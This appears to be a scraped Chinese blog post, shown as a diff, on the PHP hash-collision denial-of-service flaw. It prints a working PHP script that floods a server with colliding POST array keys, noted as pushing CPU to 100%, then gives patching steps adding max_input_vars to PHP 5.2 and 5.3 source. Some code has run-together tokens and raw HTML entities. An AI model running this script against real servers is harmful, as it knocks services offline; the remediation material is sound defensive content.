@@ -1,0 +1,9 @@
+              
+          
+    <?php$host=&#39;www.i5good.com/xxx.php&#39;;$data=&#39;&#39;;$size=pow(2,15);for($key=0,$max=($size-1)*$size;$key<=$max;$key+=$size){$data.=&#39;&;array[&#39;.$key.&#39;]=0&#39;;}$ret=curl($host,ltrim($data,&#39;&;&#39;));var_dump($ret);functioncurl($url,$post,$timeout=30){$ch=curl_init();curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout-5);curl_setopt($ch,CURLOPT_HTTPHEADER,array(&#39;Expect:&#39;));curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_POST,true);curl_setopt($ch,CURLOPT_POSTFIELDS,$post);$output=curl_exec($ch);if($output===false)returnfalse;$info=curl_getinfo($ch);$http_code=$info[&#39;http_code&#39;];if($http_code==404)returnfalse;curl_close($ch);return$output;}?>执行这个php程序会使服务器cpu直接占用100%，请不要搞破坏哦～～
+下面是修补的方法：
+    php-5.2.x:到这里github.com/laruence/laruence.github.com/tree/master/php-5.2-max-input-vars下载对应的补丁版本，进入php目录，执行patch-p1<php-5.2.*-max-input-vars.patch打上补丁，之后make和makeinstall即可。php-5.3.x:php-5.3.x没有提供相应的补丁版本，laruence建议使用php5.3.x的升级到5.3.9RC4或者按照php5.2.x的补丁修改适应成php5.3.x的补丁。下面我们提供直接修改文件的方法，虽然比较麻烦。1、修改/main/main.c文件，把STD_PHP_INI_ENTRY宏加到main.c的PHP_INI_BEGIN()和PHP_INI_END()宏之间来注册PHPINI指令：STD_PHP_INI_ENTRY(&quot;max_input_vars&quot;,&quot;1000&quot;,PHP_INI_SYSTEM|PHP_INI_PERDIR,OnUpdateLongGEZero,max_input_vars,php_core_globals,core_globals)2、修改文件/main/php_globals.h，_php_core_globals结构体内加上:longmax_input_vars;3、修改文件/main/php_variables.c，在:zend_symtable_update(symtable1,escaped_index,index_len+1,&;gpc_element,sizeof(zval*),(void**)&;gpc_element_p);之前加入：if(zend_hash_num_elements(symtable1)>=PG(max_input_vars)){php_error_docref(NULLTSRMLS_CC,E_ERROR,&quot;Inputvariablesexceeded%ld.Toincreasethelimitchangemax_input_varsinphp.ini.&quot;,PG(max_input_vars));}一共有两处，第一处数组中的键时的操作，而第二处是普通变量时的操作。
+    
+    
+      
+来自:http://www.i5good.com/2012042391.html
